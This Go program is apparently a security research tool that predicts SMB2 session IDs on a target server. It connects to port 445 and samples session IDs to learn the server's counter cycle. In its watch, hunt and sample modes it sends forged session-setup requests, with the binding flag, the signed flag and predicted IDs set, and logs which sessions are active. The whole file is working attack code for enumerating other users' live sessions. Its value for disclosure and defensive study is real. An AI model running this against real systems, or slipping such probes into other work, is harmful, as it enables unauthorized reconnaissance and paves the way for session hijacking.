package main

// Copyright (C) 2020 Critical Research Corporation

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/hdm/rumble-tools/pkg/rnd"
)

func main() {
	usage := fmt.Sprintf("Usage: "+
		"\t%s <target> watch\n"+
		"\t%s <target> hunt\n",
		"\t%s <target> sample\n", os.Args[0], os.Args[0],os.Args[0],
	)

	if len(os.Args) < 3 {
		fmt.Fprintln(os.Stderr, usage)
		os.Exit(1)
	}

	dst := os.Args[1]
	mod := os.Args[2]
	switch mod {
	case "watch":
		doMonitor(dst)
	case "hunt":
		doHunt(dst)
	case "sample":
		doSample(dst)
	default:
		fmt.Fprintln(os.Stderr, usage)
	}
}

func doMonitor(dst string) {
	showInfo := false

	c := rnd.NewCounterPredictor(3, 10)
	for {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}

		if !showInfo {
			log.Printf("%s: determining the session cycle for %v", dst, info)
			showInfo = true
		}

		newSID := decodeSessionID(info["smb.SessionID"])
		if !c.Ready() {

			if c.GetSampleCount() > 250 {
				log.Printf("%s: could not determine cycle after 250 requests", dst)
				return
			}

			if c.SubmitSample(newSID) {
				log.Printf("%s: cycle found after %d requests: %s", dst, c.GetSampleCount(), rnd.U64SliceToSeq(c.GetCycle()))
				log.Printf("%s: watching for new sessions...", dst)
			}

			continue
		}

		foundSessions, err := c.Check(newSID)
		if err != nil {
			log.Printf("%s: %s, recalibrating...", dst, err)
			c = rnd.NewCounterPredictor(3, 10)
			showInfo = false
			continue
		}

		for _, found := range foundSessions {
			res, _ := probe(dst, fmt.Sprintf("0x%.16x", found))
			sig := ""
			if res["smb.Signature"] != "" {
				sig = "sig:" + res["smb.Signature"]
			}

			status := res["smb.Status"]

			switch status {
			case "0xc0000203":
				status = "EXPIRED"
			case "0xc0000022":
				status = fmt.Sprintf("ACTIVE dialect:%s", res["smb.Dialect"])
			case "0xc000000d":
				status = fmt.Sprintf("ACTIVE dialect:!%s", res["smb.Dialect"])
			}

			log.Printf("%s: SESSION 0x%.16x is %s %s", dst, found, status, sig)
		}

		time.Sleep(time.Second)
	}
}

func doHunt(dst string) {
	log.Printf("%s: warning: hunt mode is unreliable and unlikely to find older sessions", dst)
	showInfo := false

	c := rnd.NewCounterPredictor(3, 10)

Predict:
	for {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}

		if !showInfo {
			log.Printf("%s: determining the session cycle for %v", dst, info)
			showInfo = true
		}

		newSID := decodeSessionID(info["smb.SessionID"])
		if !c.Ready() {

			if c.GetSampleCount() > 250 {
				log.Printf("%s: could not determine cycle after 250 requests", dst)
				return
			}

			if c.SubmitSample(newSID) {
				log.Printf("%s: cycle found after %d requests: %s", dst, c.GetSampleCount(), rnd.U64SliceToSeq(c.GetCycle()))
				log.Printf("%s: hunting for existing sessions...", dst)
			}

			continue
		}

		sid := newSID

		cnt := 0
		for {

			if cnt > 10000 {
				log.Printf("%s: giving up...", dst)
				break Predict
			}

			sid, err = c.Previous(sid)
			if err != nil {
				log.Printf("%s: %s, exiting...", dst, err)
				break Predict
			}

			res, err := probe(dst, fmt.Sprintf("0x%.16x", sid))
			if err != nil {
				log.Printf("%s: %s, exiting...", dst, err)
				break Predict
			}
			cnt++

			if cnt%1000 == 0 {
				log.Printf("%s: sent %d requests (%x)", dst, cnt, sid)
			}

			sig := ""
			if res["smb.Signature"] != "" {
				sig = "sig:" + res["smb.Signature"]
			}

			status := res["smb.Status"]

			switch status {
			case "0xc0000203":
				continue
			case "0xc0000022":
				status = fmt.Sprintf("ACTIVE dialect:%s", res["smb.Dialect"])
			case "0xc000000d":
				status = fmt.Sprintf("ACTIVE dialect:!%s", res["smb.Dialect"])
			default:
				status = fmt.Sprintf("UNKNOWN %v", res)
			}

			log.Printf("%s: SESSION 0x%.16x is %s %s", dst, sid, status, sig)
		}
	}
}


func doSample(dst string) {
	showInfo := false

	for x:= 0; x <= 100; x++ {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}
		 
		if ! showInfo {
			log.Printf("%s: sample 100 session IDs for %v", dst, info)
			showInfo = true
		}

		log.Printf("%s", info["smb.SessionID"])
	}
}

func probe(dip string, patchSID string) (map[string]string, error) {
	info := make(map[string]string)
	dst := dip + ":445"

	conn, err := net.DialTimeout("tcp", dst, rnd.SMBReadTimeout)
	if err != nil {
		return info, err
	}
	defer conn.Close()

	err = rnd.SMBSendData(conn, rnd.SMB1NegotiateProtocolRequest)
	if err != nil {
		return info, err
	}

	data, err := rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	if err != nil {
		return info, err
	}

	err = rnd.SMBSendData(conn, rnd.SMB2NegotiateProtocolRequest(dip))
	if err != nil {
		return info, err
	}

	data, _ = rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	rnd.SMB2ExtractFieldsFromNegotiateReply(data, info)

	setup := make([]byte, len(rnd.SMB2SessionSetupNTLMSSP))
	copy(setup, rnd.SMB2SessionSetupNTLMSSP)

	// Set the ProcessID
	binary.LittleEndian.PutUint16(setup[4+32:], 0xfeff)

	if patchSID != "" {
		// Set the SMB2_SESSION_FLAG_BINDING flag
		setup[4+66] = 1

		// Set the Signed PDU flag
		binary.LittleEndian.PutUint16(setup[4+16:], 0x08)

		// Set the SessionID
		sid := decodeSessionID(patchSID)
		binary.LittleEndian.PutUint64(setup[4+40:], sid)
	}

	err = rnd.SMBSendData(conn, setup)
	if err != nil {
		return info, err
	}

	data, err = rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	rnd.SMB2ExtractSIDFromSessionSetupReply(data, info)
	rnd.SMBExtractFieldsFromSecurityBlob(data, info)

	return info, err
}

func decodeSessionID(sid string) uint64 {
	sid = strings.Replace(sid, "0x", "", -1)
	sidV, err := strconv.ParseUint(sid, 16, 64)
	if err != nil {
		return 0
	}
	return sidV
}
